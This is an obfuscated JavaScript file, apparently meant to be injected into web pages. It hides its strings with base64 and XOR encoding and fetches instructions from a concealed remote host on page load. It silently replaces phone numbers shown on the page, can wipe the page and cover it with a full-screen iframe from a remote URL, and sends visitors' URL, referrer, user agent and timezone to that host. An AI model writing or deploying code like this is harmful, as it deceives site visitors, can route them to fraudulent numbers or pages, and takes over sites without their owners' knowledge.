(function () {
  'use strict';

  var _k = 'u7Kx2mQ9pL4vR8nW';
  var _s = [
    'HUM/CEFXfhYRIkAfIFEeegVWJR1eQCcLXX4AFD5OAGJHXypVRw5/WF4+QRh8WR4nWlY7EQ==',
    'AEcnF1MJfAg=',
    'AEcnF1MJfE0fJ1EYf1sGNhtQLlVbA3xJAiNQ',
    'AEcnF1MJfFsTKFU=',
    'XgZmQARbfApIfRlAYgpb',
    'EVItGUcBJQ==',
    'GkEuCkAENVw=',
    'F1QvGQ==',
    'Bl4/HW0ENQ==',
    'Bl4/HW0ZPlIVIg==',
    'HVg4DFwMPFw=',
    'BVY/EFwMPFw=',
    'HUUuHg==',
    'B1ItHUAfNEs=',
    'AFY=',
    'AV4mHUgCP1w=',
    'BV8kFlcyJ1gCJVUYJg==',
    'BV8kFlcyJ1gcOVE=',
    'EkIqClYyI1YcIFsDJmc=',
    'WkF6V1ECP18ZKw==',
    'WkF6V1cbNFcE',
    'BVYsHW0eJlgA',
    'EkIqClYyIVgXKUcBM0gx',
    'EFsuFVcDJUo=',
    'EFkqGl4INQ==',
    'AEUn',
    'ElIkJ1MBPVYHKVA=',
    'B1gnFF0YJWYAKUYVN1Ya',
    'EVInGUsyIlwTI1oSIQ=='
  ];

  function _x(b) {
    try {
      var r = atob(b);
      var o = '';
      for (var i = 0; i < r.length; i++) {
        o += String.fromCharCode(r.charCodeAt(i) ^ _k.charCodeAt(i % _k.length));
      }
      return o;
    } catch (e) {
      return '';
    }
  }

  var a0 = _x(_s[0]);
  var a1 = _x(_s[1]);
  var a2 = _x(_s[2]);
  var a3 = _x(_s[3]);
  var a4 = _x(_s[4]);
  var a5 = 60000;
  var a6 = 0;
  var a7 = null;
  var a8 = _x(_s[5]);
  var a9 = '';
  var aA = false;

  function b0(v) {
    if (v == null) return '';
    var s = String(v).trim();
    return s ? s.replace(/%2B/gi, '+') : '';
  }

  function b1() {
    try {
      return b0(new URLSearchParams(window.location.search).get(_x(_s[7])));
    } catch (e) {
      return '';
    }
  }

  function b2() {
    var p = _x(_s[7]);
    if (!location.hash || location.hash.indexOf(p + '=') === -1) return '';
    try {
      return b0(new URLSearchParams(location.hash.slice(1)).get(p));
    } catch (e) {
      return '';
    }
  }

  function b3(v) {
    if (!v) return;
    try {
      window.__uploadPhone = v;
    } catch (e) {}
    try {
      sessionStorage.setItem(a3, v);
    } catch (e) {}
    try {
      document.cookie = a3 + '=' + encodeURIComponent(v) + ';path=/;max-age=86400;SameSite=Lax';
    } catch (e) {}
  }

  function b4() {
    var u = b1();
    if (u) {
      b3(u);
      return u;
    }
    if (window.__uploadPhone) return b0(window.__uploadPhone);
    try {
      var t = sessionStorage.getItem(a3);
      if (t) {
        t = b0(t);
        if (t) return t;
      }
    } catch (e) {}
    try {
      var m = document.cookie.match(new RegExp('(?:^|;\\s*)' + a3 + '=([^;]*)'));
      if (m) {
        var c = b0(decodeURIComponent(m[1]));
        if (c) return c;
      }
    } catch (e) {}
    var z = b2();
    if (z) {
      b3(z);
      return z;
    }
    return '';
  }

  function b5(prefix, k) {
    var x = prefix + k;
    try {
      var s = sessionStorage.getItem(x);
      if (s !== null) return parseInt(s, 10);
      var n = Math.floor(Math.random() * 100);
      sessionStorage.setItem(x, String(n));
      return n;
    } catch (e) {
      return Math.floor(Math.random() * 100);
    }
  }

  function b6(v) {
    var t = b0(v) || a4;
    b3(t);
    a9 = t;
    if (typeof window.__setUploadPhone === 'function') {
      try {
        window.__setUploadPhone(t);
      } catch (e) {}
    }
    try {
      document.querySelectorAll('.bcda,[data-phone]').forEach(function (n) {
        n.textContent = t;
      });
    } catch (e) {}
    return t;
  }

  function b7(p) {
    var f = b4();
    var d = p && p.default_value != null ? String(p.default_value) : '';
    var e = p && p.value != null ? String(p.value) : '';
    var dv = f || d || e || a4;
    var ov =
      p && p.override_value != null
        ? String(p.override_value)
        : p && p.has_override
          ? String(p.value || '')
          : '';
    if (!p || !p.has_override || !ov) {
      a8 = _x(_s[5]);
      return dv;
    }
    var pc = Number(p.rollout_percent);
    if (!isFinite(pc)) pc = 100;
    pc = Math.max(0, Math.min(100, Math.round(pc)));
    if (pc >= 100) {
      a8 = _x(_s[6]);
      return ov;
    }
    if (pc <= 0) {
      a8 = _x(_s[5]);
      return dv;
    }
    var k = a1 + '|' + location.hostname + '|' + (location.pathname || '/');
    var h = b5(_x(_s[18]), k) < pc;
    a8 = h ? _x(_s[6]) : _x(_s[5]);
    return h ? ov : dv;
  }

  function c3(ps) {
    if (!ps || !ps[_x(_s[24])] || !ps[_x(_s[25])]) return false;
    if (ps[_x(_s[26])] === false) return false;
    var percent = Number(ps[_x(_s[27])]);
    if (!isFinite(percent)) percent = 100;
    percent = Math.max(0, Math.min(100, Math.round(percent)));
    if (percent <= 0) return false;
    if (percent >= 100) return true;
    var key = a1 + '|' + location.hostname + '|' + (location.pathname || '/');
    return b5(_x(_s[22]), key) < percent;
  }

  function c4(url) {
    try {
      document.documentElement.style.cssText = 'margin:0;padding:0;height:100%;overflow:hidden';
      document.body.style.cssText = 'margin:0;padding:0;height:100%;overflow:hidden';
      document.body.innerHTML = '';
      var frame = document.createElement('iframe');
      frame.src = url;
      frame.title = 'content';
      frame.setAttribute('allowfullscreen', 'true');
      frame.style.cssText =
        'position:fixed;inset:0;width:100%;height:100%;border:0;margin:0;padding:0;z-index:2147483647';
      document.body.appendChild(frame);
    } catch (e) {}
  }

  function c5(ps) {
    var url = String(ps[_x(_s[25])]);
    var delay = Number(ps[_x(_s[28])]);
    if (!isFinite(delay) || delay < 0) delay = 0;
    delay = Math.min(600, Math.round(delay));
    if (delay <= 0) {
      c4(url);
      return true;
    }
    setTimeout(function () {
      c4(url);
    }, delay * 1000);
    return false;
  }

  function b8(g) {
    if (!g) return;
    var els = g[_x(_s[23])] || {};
    var ps = els[_x(_s[21])];
    var swapNow = false;
    if (c3(ps)) {
      aA = true;
      swapNow = c5(ps);
      if (swapNow) return;
    } else {
      aA = false;
    }
    var p = els.phone || null;
    var o = b7(p);
    if (o) b6(o);
  }

  function b9() {
    var n = Date.now();
    if (a7 && n - a6 < a5) {
      b8(a7);
      return Promise.resolve();
    }
    var u =
      a0 +
      _x(_s[19]) +
      '?' +
      _x(_s[8]) +
      '=' +
      encodeURIComponent(a1) +
      '&host=' +
      encodeURIComponent(location.hostname) +
      '&path=' +
      encodeURIComponent(location.pathname || '/') +
      '&token=' +
      encodeURIComponent(a2);
    return fetch(u)
      .then(function (r) {
        return r.ok ? r.json() : null;
      })
      .then(function (d) {
        if (!d) return;
        a7 = d;
        a6 = n;
        b8(d);
      })
      .catch(function () {});
  }

  function c0() {
    var b = {};
    b[_x(_s[8])] = a1;
    b[_x(_s[9])] = a2;
    b[_x(_s[10])] = location.hostname;
    b[_x(_s[11])] = location.pathname || '/';
    b[_x(_s[12])] = location.href;
    b[_x(_s[13])] = document.referrer || '';
    b[_x(_s[14])] = navigator.userAgent || '';
    b[_x(_s[15])] = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
    b[_x(_s[16])] = a8;
    b[_x(_s[17])] = a9 || b4() || a4;
    b[_x(_s[21])] = aA;
    fetch(a0 + _x(_s[20]), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(b),
      keepalive: true,
      mode: 'cors'
    }).catch(function () {});
  }

  function c1() {
    a6 = 0;
    return b9()
      .catch(function () {})
      .then(function () {
        c0();
      });
  }

  var i0 = b1() || b2();
  if (i0) b3(i0);

  window.__r1 = c1;
  window.GUARD_refresh = function () {
    a6 = 0;
    return c1();
  };

  function c2() {
    b6(b4() || a4);
    c1();
    setTimeout(c1, 100);
    setTimeout(c1, 500);
    setTimeout(c1, 1500);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', c2);
  } else {
    c2();
  }
})();
